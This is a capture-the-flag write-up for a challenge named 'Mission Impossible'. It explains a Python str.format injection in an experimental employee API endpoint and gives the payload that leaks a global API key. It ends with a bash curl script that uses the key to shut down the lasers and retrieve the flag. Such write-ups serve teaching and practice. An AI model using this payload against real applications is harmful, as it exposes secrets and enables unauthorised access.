# Mission Impossible

## Challenge

We are given a URL where we can access an API and a livestream that shows a box with lasers around a flag.

One API endpoint requires authentication using an API key.
This endpoint is `/api/v1/security-controls/shutdown` and can be used to turn off the lasers.

Some other endpoints exist, including a couple that return information about employees.
These endpoints do not require authentication.

Documentation is available for all endpoints.

## Solution

The `/api/v1/employees/format` endpoint stands out because of this comment:

```py
# !!! EXPERIMENTAL !!!
#
# This API endpoint is functional but it has not been audited by our security team.
# While it is functional, we can not guarantee that there are no vulnerabilities.
```

If we look at the route, we find that it accepts a format string and processes it with a `person` parameter.

```py
template = request.args['template']
return template.format(person=employees[0])
```

This is a format string vulnerability as we have full control over the format string.
We can use this to access other objects, outside the intended scope.

We can access global variables by sending the string:

```py
"{person.__init__.__globals__[CONFIG][API_KEY]}"
```

This format specifier will be replaced with the global `CONFIG['API_KEY']`.

We can then send this key as a header to the `/api/v1/security-controls/shutdown` endpoint, specifying all 4 lasers.
This will shutdown all lasers and return the flag.

## Exploit

```bash
#!/bin/bash

API_KEY=$(curl -s "http://srv1.momandpopsflags.ca:45451/api/v1/employees/format?template=%7Bperson.__init__.__globals__%5BCONFIG%5D%5BAPI_KEY%5D%7D")
curl -s "http://srv1.momandpopsflags.ca:45451/api/v1/security-controls/shutdown" \
    -H "Content-Type:application/json" \
    -H "X-API-Key: $API_KEY" \
    -d '{"lasers": ["laser0", "laser1", "laser2", "laser3"]}'
```

## Flag

```
magpie{ju5t_w0rm_4r0und_th3_la53r5}
```
